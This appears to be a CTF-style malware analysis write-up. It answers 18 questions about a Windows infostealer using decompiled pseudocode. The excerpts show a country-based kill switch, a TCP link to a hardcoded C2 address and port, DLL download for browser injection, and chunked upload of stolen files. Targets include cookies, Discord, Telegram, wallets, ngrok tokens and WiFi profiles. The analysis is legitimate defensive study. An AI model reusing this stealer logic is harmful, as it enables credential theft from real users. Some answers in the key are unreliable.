## 1. What is the size in bytes of the memory block containing the sequence of pointers to country code strings?
```bash
v0 = off_140010DA0;
  v1 = 18i64;
  v2 = &v239;
  *(_QWORD *)&v238.dwSize = 0x42003F00430019i64;
  while ( v1 )
  {
    v2->dwFileAttributes = *(_DWORD *)v0;
    v0 = (char **)((char *)v0 + 4);
    v2 = (struct _WIN32_FIND_DATAW *)((char *)v2 + 4);
    --v1;
  }
  v3 = 0i64;
  v238.th32ProcessID = 2818088;
  *((_WORD *)&v238.th32ProcessID + 2) = 44;
  LOWORD(v236.dwFileAttributes) = 0;
  BYTE2(v236.dwFileAttributes) = 0;
  LOWORD(v237.dwFileAttributes) = 0;
  BYTE2(v237.dwFileAttributes) = 0;
  KeyboardLayout = (unsigned int)GetKeyboardLayout(0);
  GetLocaleInfoA(KeyboardLayout, 0x5Au, (LPSTR)&v237, 3);
  GetLocaleInfoA(0x400u, 0x5Au, (LPSTR)&v236, 3);
  SystemDefaultLangID = GetSystemDefaultLangID();
  do
  {
    v6 = (const char *)*((_QWORD *)&v239.dwFileAttributes + v3);
    if ( !strcmp((const char *)&v236, v6) || !strcmp((const char *)&v237, v6) )
      return 1;
    ++v3;
  }
  while ( v3 != 9 );
```
```bash
.data:0000000140010DA0 off_140010DA0   dq offset aRu           ; DATA XREF: sub_140006F86+3B↑o
.data:0000000140010DA0                                         ; "RU"
.data:0000000140010DA8                 dq offset aBy           ; "BY"
.data:0000000140010DB0                 dq offset aKz           ; "KZ"
.data:0000000140010DB8                 dq offset aKg           ; "KG"
.data:0000000140010DC0                 dq offset aTj           ; "TJ"
.data:0000000140010DC8                 dq offset aUz           ; "UZ"
.data:0000000140010DD0                 dq offset aAm           ; "AM"
.data:0000000140010DD8                 dq offset aAz           ; "AZ"
.data:0000000140010DE0                 dq offset aMd           ; "MD"
.data:0000000140010DE8                 align 20h
```
- off_140010DA0 is an array and is treated as array pointer on `v0`, stealer tried to get locale iso and iter for all country in array, total is 9
- Then total bytes is 9*8 = 72 (64 bit mode)

**72**

## 2. What is the name of the enumeration type for the first parameter of GetLocaleInfoA?
```bash
KeyboardLayout = (unsigned int)GetKeyboardLayout(0);
  GetLocaleInfoA(KeyboardLayout, 0x5Au, (LPSTR)&v237, 3);
  GetLocaleInfoA(0x400u, 0x5Au, (LPSTR)&v236, 3);
```
- Follow ms about `GetLocaleInfoA`
```bash
int GetLocaleInfoA(
  LCID   Locale,     // <-- first parameter
  LCTYPE LCType,
  LPSTR  lpLCData,
  int    cchData
);
```
- LCID stands for Locale Identifier.It's a 32-bit value that uniquely identifies a particular locale:
    - LOCALE_USER_DEFAULT (0x0400)
    - LOCALE_SYSTEM_DEFAULT (0x0800)
Ex:
```bash
LCID lcid = MAKELCID(LANG_ENGLISH, SORT_DEFAULT);
GetLocaleInfoA(lcid, LOCALE_SLANGUAGE, buffer, bufferSize);
```

**LOCALE_USER_DEFAULT**

## 3. What protocol is used by the malware to communicate with the C2 server?
```bash
 while ( 1 )
  {
    v199 = socket(2, 1, 0);
    if ( v199 == -1i64 )
    {
      WSACleanup();
      return 1;
    }
    v218.sa_family = 2;
    *(_DWORD *)&v218.sa_data[2] = inet_addr("185.107.74.40");
    *(_WORD *)v218.sa_data = htons(0xC3Bu);
    if ( connect(v199, &v218, 16) >= 0 )
      break;
    closesocket(v199);
    Sleep(0x1388u);
  }
```
- refer to document
```bash
SOCKET socket(int af, int type, int protocol);
```
> af = 2 → AF_INET (IPv4)

> type = 1 → SOCK_STREAM

> protocol = 0 → Default for SOCK_STREAM, which is TCP
- setup C2
```bash
*(_DWORD *)&v218.sa_data[2] = inet_addr("185.107.74.40");
*(_WORD *)v218.sa_data = htons(0xC3Bu); // Port 0xC3B = 3131
```

**TCP**

## 4. What is the port number used by the malware to connect to the C2 server in decimal?
```bash
*(_WORD *)v218.sa_data = htons(0xC3Bu); // Port 0xC3B = 3131
```

**3131**

## 5. What is the maximum chunk size the malware uses to download the injected DLL in hex?
```bash
getenv("TEMP");
  sub_14000FAE0(v221, "%s\\received_dll.dll");
  v211 = 0;
  if ( recv(v199, (char *)&v211, 4, 0) == 4 )
  {
    v211 = ntohl(v211);
    if ( v211 - 1 <= 0x5F5E0FE )
    {
      v13 = 0;
      v14 = fopen(v221, "wb");
      if ( v14 )
      {
        while ( v13 < v211 )
        {
          v15 = v211 - v13;
          if ( v211 - v13 > 0x1000 )
            v15 = 4096;
          v16 = recv(v199, (char *)&v239, v15, 0);
          if ( v16 <= 0 )
            break;
          v13 += v16;
          fwrite(&v239, 1ui64, v16, v14);
```
- Remain bytes will be compared to 0x1000 (4096 bytes), if it's greater, then fixed it to 4096, then the maximum chunk size is 4096 bytes

**0x1000**

## 6. What is the address of the function responsible for launching browsers for injection in hex ?
```bash
while ( 1 )
            {
              while ( 1 )
              {
                v28 = L"msedge.exe";
                if ( strcmp(v203, "edge") )
                {
                  v28 = L"chrome.exe";
                  if ( !strcmp(v203, "brave") )
                    v28 = L"brave.exe";
                }
                Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);
                v30 = Toolhelp32Snapshot;
                if ( Toolhelp32Snapshot != (HANDLE)-1i64 )
                {
                  v238.dwSize = 568;
                  if ( Process32FirstW(Toolhelp32Snapshot, &v238) )
                  {
                    do
                    {
                      if ( !wcsicmp(v238.szExeFile, v28) )
                      {
                        v31 = OpenProcess(1u, 0, v238.th32ProcessID);
                        v32 = v31;
                        if ( v31 )
                        {
                          TerminateProcess(v31, 0);
                          CloseHandle(v32);
                        }
                      }
                    }
                    while ( Process32NextW(v30, &v238) );
                  }
                  CloseHandle(v30);
                }
                if ( !(unsigned int)((__int64 (__fastcall *)(const char *))sub_140002AEB)(v203) )
                  goto LABEL_68;
```
- it check for browser name, crea snapshot to find exactly process, load it then do dll injection by creating remotethread

**0x140002AEB**

## 7. What is the address of the start of the loop that checks if a process matches the target browser executable name in hex?
```bash
.text:000000014000755F loc_14000755F:                          ; CODE XREF: sub_140006F86+5F8↓j
.text:000000014000755F                 lea     rcx, [rsp+40h+pe.szExeFile] ; String1
.text:0000000140007567                 mov     rdx, rbp        ; String2
.text:000000014000756A                 call    r13 ; _wcsicmp
.text:000000014000756D                 test    eax, eax
.text:000000014000756F                 jz      short loc_14000758B
```
```bash
              while ( 1 )
              {
                v28 = L"msedge.exe";
                if ( strcmp(v203, "edge") )
                {
                  v28 = L"chrome.exe";
                  if ( !strcmp(v203, "brave") )
                    v28 = L"brave.exe";
                }
                Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);
                v30 = Toolhelp32Snapshot;
                if ( Toolhelp32Snapshot != (HANDLE)-1i64 )
                {
                  v238.dwSize = 568;
                  if ( Process32FirstW(Toolhelp32Snapshot, &v238) )
                  {
                    do
                    {
                      if ( !wcsicmp(v238.szExeFile, v28) )
                      {
                        v31 = OpenProcess(1u, 0, v238.th32ProcessID);
                        v32 = v31;
                        if ( v31 )
                        {
                          TerminateProcess(v31, 0);
                          CloseHandle(v32);
                        }
                      }
                    }
                    while ( Process32NextW(v30, &v238) );
```

**0x14000755F**

## 8. What is the maximum chunk size the malware uses when sending the file contents to the C2 server in hex?
```bash
// positive sp value has been detected, the output may be wrong!
__int64 sub_1400019C5()
{
  const char *v0; // rdx
  const char *v1; // rdi
  SOCKET v2; // r8
  SOCKET v3; // rsi
  const char *v4; // rcx
  FILE *v5; // rbx
  int v6; // eax
  int v8; // ebp
  int i; // eax
  size_t v10; // rax
  u_long v11; // [rsp+2Ch] [rbp-102Ch] BYREF
  char v12[4136]; // [rsp+30h] [rbp-1028h] BYREF

  sub_14000B730();
  v1 = v0;
  v3 = v2;
  v5 = fopen(v4, "rb");
  if ( v5 )
  {
    v6 = strlen(v1);
    if ( send(v3, v1, v6 + 1, 0) != -1 )
    {
      fseek(v5, 0, 2);
      v8 = ftell(v5);
      fseek(v5, 0, 0);
      v11 = htonl(v8);
      for ( i = send(v3, (const char *)&v11, 4, 0); i != -1; i = send(v3, v12, v10, 0) )
      {
        v10 = fread(v12, 1ui64, 0x1000ui64, v5);
        if ( !v10 )
        {
          fclose(v5);
          return 0i64;
        }
      }
    }
    fclose(v5);
  }
  return 0xFFFFFFFFi64;
}
```

**0x1000**

## 9. What is the wildcard used to find Discord version folders?
```bash
wcscpy((wchar_t *)v234, (const wchar_t *)v233);
sub_140005225((wchar_t *)v234, (wchar_t *)L"app-*");
```
`sub_140005225` appends the wildcard `app-*` to the path stored in `v233` (which points to the Discord directory, typically `%APPDATA%\Discord`), resulting in a pattern like `%APPDATA%\Discord\app-*`. This wildcard matches folders such as `app-1.0.9001, app-1.0.9002`, etc., which represent different Discord version installations. The function then uses `FindFirstFileW` to enumerate folders matching this pattern in the Discord directory

**app-\***

## 10. What is the maximum number of retries for uploading the cookies copy to the C2?
```bash
v13 = 3;
sub_14000FB40(v33, 0x104ui64, "%s/%s/Cookies_copy.db", v18, v34.cFileName);
while ( (unsigned int)sub_1400019C5() )
{
    LastError = GetLastError();
    if ( !--v13 )
    break;
    if ( LastError == 32 || LastError == 5 )
    sub_14000659B();
}
```

**3**

## 11. How many important files per profile does the function attempt to find and send?

**6**

## 12. How many characters long is the random ID generated for the temporary wallet dump directory?
```bash
  strcpy((char *)v35, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789");
  v1 = 0i64;
  v2 = time64(0i64);
  v3 = GetCurrentProcessId() + v2;
  srand(v3);
  do
    v27[v1++] = *((_BYTE *)v35 + rand() % 0x3Eui64);
  while ( v1 != 12 );
```

**12**

## 13. What is the address of the function that used to search about the telegram data?
```bash
 if ( SHGetFolderPathA(0i64, 26, 0i64, 0, (LPSTR)&v239) >= 0 )
    sub_14000FB40(v227, 0x104ui64, "%s\\Telegram Desktop\\tdata");
  v69 = v228;
  ((void (__fastcall *)(SOCKET, char *, const char *))sub_140001AB2)(v199, v227, "Telegram-tdata");
```

**0x140001AB2**

## 14. When the malware writes the CPU core count to the file, which function does it call immediately before writing?
```bash
fputs("===== System Information =====\n\n", v84);
    GetSystemInfo(v230);
    sub_14000F720(v85, "CPU Core Count: %u\n");
```

**GetSystemInfo**

## 15. Which configuration filename does the malware specifically look for to extract the ngrok authtoken?
```bash
if ( getenv("USERNAME")
      && (v105 = 0,
          sub_14000FB40((char *)&v238, 0x104ui64, "C:\\Users\\%s\\AppData\\Local\\ngrok\\ngrok.yml"),
          (v106 = fopen((const char *)&v238, "r")) != 0i64) )
    {
      while ( fgets((char *)&v239, 1024, v106) )
      {
        if ( strstr((const char *)&v239, "authtoken:") )
        {
          v105 = 1;
          fputs((const char *)&v239, v104);
        }
      }
```

**ngrok.yml**

## 16. What command does the malware run to list all saved WiFi profiles on the system?
```bash
    if ( (unsigned int)((__int64 (__fastcall *)(const char *, char *))sub_140005263)("netsh wlan show profiles", v26) )
    {
      v4 = 0;
      for ( j = strtok(v26, "\n"); j; j = strtok(0i64, "\n") )
      {
        if ( strstr(j, "All User Profile") )
```

**netsh wlan show profiles**

## 17. Which the full registry key is opened to locate the Foxmail executable path?
```bash
 LODWORD(FirstFileA) = RegOpenKeyExA(
                          HKEY_LOCAL_MACHINE,
                          "SOFTWARE\\Classes\\Foxmail.url.mailto\\Shell\\open\\command",
                          0,
                          0x20019u,
                          &hKey);
```

**HKEY_LOCAL_MACHINE\SOFTWARE\Classes\Foxmail.url.mailto\Shell\open\command**

## 18. What is the address of the function used to extract gaming account data in hex?
- Inside sub_140003FC0, stealer is trying to get game info
```bash
v18 = FindFirstFileA(v27, &v33);
              if ( v18 != (HANDLE)-1i64 )
              {
                do
                {
                  if ( strcmp(v33.cFileName, ".") && strcmp(v33.cFileName, "..") )
                  {
                    sub_14000FB40(v28, 0x104ui64, "%s\\%s");
                    if ( (v33.dwFileAttributes & 0x10) != 0
                      || (strstr(v33.cFileName, ".ldb")
                       || strstr(v33.cFileName, ".log")
                       || strstr(v33.cFileName, ".config")
                       || strstr(v33.cFileName, ".vdf")
                       || strstr(v33.cFileName, ".json")
                       || strstr(v33.cFileName, ".dat")
                       || strstr(v33.cFileName, ".cfg")
                       || strstr(v33.cFileName, ".ini")
                       || strstr(v33.cFileName, ".db")
                       || strstr(v33.cFileName, ".sqlite"))
                      && (sub_14000FB40((char *)&v34, 0x104ui64, "Games/%s/%s/%s"),
                          sub_1400019C5(),
                          (v33.dwFileAttributes & 0x10) != 0) )
                    {
                      if ( !strcmp(v33.cFileName, "leveldb") )
                      {
                        sub_14000FB40(v30, 0x104ui64, "%s\\%s");
                        sub_14000FB40(v29, 0x104ui64, "%s\\*");
                        v19 = FindFirstFileA(v29, &v34);
                        v20 = v19;
                        if ( v19 != (HANDLE)-1i64 )
                        {
                          do
                          {
                            if ( strcmp(v34.cFileName, ".")
                              && strcmp(v34.cFileName, "..")
                              && (v34.dwFileAttributes & 0x10) == 0 )
                            {
                              sub_14000FB40(v32, 0x104ui64, "%s\\%s");
                              sub_14000FB40(v31, 0x104ui64, "Games/%s/%s/leveldb/%s");
                              sub_1400019C5();
                            }
                          }
                          while ( FindNextFileA(v20, &v34) );
                          FindClose(v20);
                        }
                      }
                    }
                  }
                }
                while ( FindNextFileA(v18, &v33) );
                v16 = v18;
                goto LABEL_73;
```

**Ans:0x140003FC0**